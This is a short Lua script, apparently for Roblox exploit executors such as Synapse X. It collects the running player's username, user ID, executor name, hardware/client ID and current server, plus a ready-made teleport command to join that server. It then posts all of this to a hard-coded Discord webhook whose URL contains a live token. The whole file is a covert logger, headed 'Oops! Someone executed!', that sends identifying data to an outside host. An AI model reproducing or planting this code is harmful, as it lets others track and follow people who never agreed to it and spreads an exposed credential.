if identifyexecutor() == "Synapse X" then
    req = syn.request;
else
    req = http_request;
end;

local data = {
    ["content"] = "";
    ["embeds"] = {
        {
            ["title"] = "Oops! Someone executed!";
            ["description"] = "**User Profile:** https://rblx.name/"..tostring(game:GetService("Players").LocalPlayer.UserId).."\n **Currently Playing:** https://rblx.games/"..game.PlaceId;
            ["type"] = "rich";
            ["color"] = nil;
            ["fields"] = {
                {
                    ["name"] = "";
                    ["value"] = "**Username:** "..game:GetService("Players").LocalPlayer.Name.."\n **User ID:** "..game:GetService("Players").LocalPlayer.UserId.."\n **Executor:** "..tostring(identifyexecutor()).."\n **Hardware ID: **"..game:GetService("RbxAnalyticsService"):GetClientId().." \n **Join Script:**"..[[```game:GetService("TeleportService"):TeleportToPlaceInstance(]]..game["PlaceId"]..[[, "]]..game["JobId"]..[[", game:GetService("Players").LocalPlayer)```]]
                }
            }
            };
    };
}

req({Url="https://discord.com/api/webhooks/1051349432769196072/V4Hcyys9WpFdltqfLa6v2cJGXQSr7LQrJAeB5f3RZvtE0BH0TBo2T5QfDc0NriwcHMDx",Body=game.HttpService:JSONEncode(data),Method="POST",Headers={["content-type"]="application/json"}})
